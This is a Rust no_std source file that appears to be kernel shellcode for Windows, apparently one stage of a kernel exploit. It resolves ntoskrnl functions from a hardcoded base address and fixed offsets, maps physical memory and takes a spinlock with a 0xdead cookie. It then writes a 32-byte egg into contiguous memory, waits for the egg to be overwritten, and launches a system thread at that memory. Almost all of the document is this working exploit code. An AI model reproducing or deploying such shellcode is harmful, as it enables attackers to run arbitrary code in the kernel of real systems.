#![no_std]
#![feature(asm)]
#![feature(core_intrinsics)]
use core::arch::asm;


#[no_mangle]
unsafe extern "stdcall"
fn _DllMainCRTStartup(
    _hinst_dll: *const u8,
    _fdw_reason: u32,
    _lpv_reserved: *const u8
) -> u64
{
    match shellcode_start() {
        Ok(_) => 0,
        Err(x) => x as _,
    }
}

unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
    // let nt_base = resolver::find_nt_base_address();
    let nt_base: ntdef::types::PVOID;
	asm!(
		"mov {0}, 0xfffff8024f205000",
		out(reg) nt_base
	);

    /*
    let ex_allocate_pool: ntdef::functions::ExAllocatePool = ntproc::find!("ExAllocatePool");
    let ke_initialize_timer: ntdef::functions::KeInitializeTimer = ntproc::find!("KeInitializeTimer");
    let ke_initialize_dpc: ntdef::functions::KeInitializeDpc = ntproc::find!("KeInitializeDpc");
    let ke_set_timer_ex: ntdef::functions::KeSetTimerEx = ntproc::find!("KeSetTimerEx");
    let mm_allocate_contiguous_memory: ntdef::functions::MmAllocateContiguousMemory = ntproc::find!("MmAllocateContiguousMemory");
    let mm_map_io_space: ntdef::functions::MmMapIoSpace = ntproc::find!("MmMapIoSpace");
    */

    let mm_allocate_contiguous_memory: ntdef::functions::MmAllocateContiguousMemory;
    let mm_map_io_space: ntdef::functions::MmMapIoSpace;
    let ps_create_system_thread: ntdef::functions::PsCreateSystemThread;
    asm!(
        "mov {1}, {0}",
        "add {1}, 0x52c980",
        in(reg) nt_base,
        out(reg) mm_allocate_contiguous_memory
    );
    asm!(
        "mov {1}, {0}",
        "add {1}, 0x318320",
        in(reg) nt_base,
        out(reg) mm_map_io_space
    );
    asm!(
        "mov {1}, {0}",
        "add {1}, 0x6428f0",
        in(reg) nt_base,
        out(reg) ps_create_system_thread
    );

    let mutex_phys = mm_map_io_space(0 as _, 128, ntdef::enums::MmNonCached);
    let acquired = try_to_acquire_fast(mutex_phys as _);
    if acquired == 1 as _ {
        let deferred_routine = mm_allocate_contiguous_memory(16384, 0xFFFFFFFFFFFFFFFF);
        // let egg = [0xccu8, 0xc3u8]; // int 3; ret
        let egg = [0x30u8, 0xf7u8, 0x97u8, 0x46u8, 0x70u8, 0x55u8, 0x47u8, 0xe3u8, 0xa6u8, 0x25u8, 0xb8u8, 0x2du8, 0xccu8, 0xabu8, 0x2fu8, 0x3eu8, 0x56u8, 0x0au8, 0x71u8, 0x00u8, 0x98u8, 0xe4u8, 0x4du8, 0xa7u8, 0x98u8, 0x1du8, 0x45u8, 0xf0u8, 0xafu8, 0x83u8, 0x50u8, 0x6du8];
        let _ = ntdef::macros::RtlCopyMemory(deferred_routine as _, &egg as _, 32);
        let mut still_egg: u32 = ntdef::macros::RtlEqualMemory(deferred_routine as _, &egg as _, 32);
        while still_egg == 1 as _ {
            still_egg = ntdef::macros::RtlEqualMemory(deferred_routine as _, &egg as _, 32);
        }
        /*
        // let _ = deferred_routine();  // compiler error
        asm!(
            "call {0}",
            in(reg) deferred_routine
        );
        */
        // no need for ExAllocatePool here
        let mut thread_handle = mm_allocate_contiguous_memory(128, 0xFFFFFFFFFFFFFFFF); 
        let _ = ps_create_system_thread(&mut thread_handle as _, ntdef::enums::THREAD_ALL_ACCESS,
            ntdef::enums::NULL, ntdef::enums::NULL, ntdef::enums::NULL, deferred_routine as _, ntdef::enums::NULL);
    }

    Ok(())
}

unsafe fn try_to_acquire_fast(sync: *mut u32) -> u32 {
    // I assume that the pointer is (can be) to uninitialized memory, so I need to xchg with some "cookie"
    // The cookie chosen is "0xdead"
    let _key: u32;
    let acquired: u32;
    asm!(
        "xor {2}, {2}",
        "mov {0:e}, 0xdead",
        "xchg {0:e}, DWORD PTR[{1}]",
        "cmp {0:e}, 0xdead",    
        "je 3f",
        "inc {2}",
        "3:",
        out(reg) _key,
        in(reg) sync,
        out(reg) acquired
    );
    acquired
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
    }
}
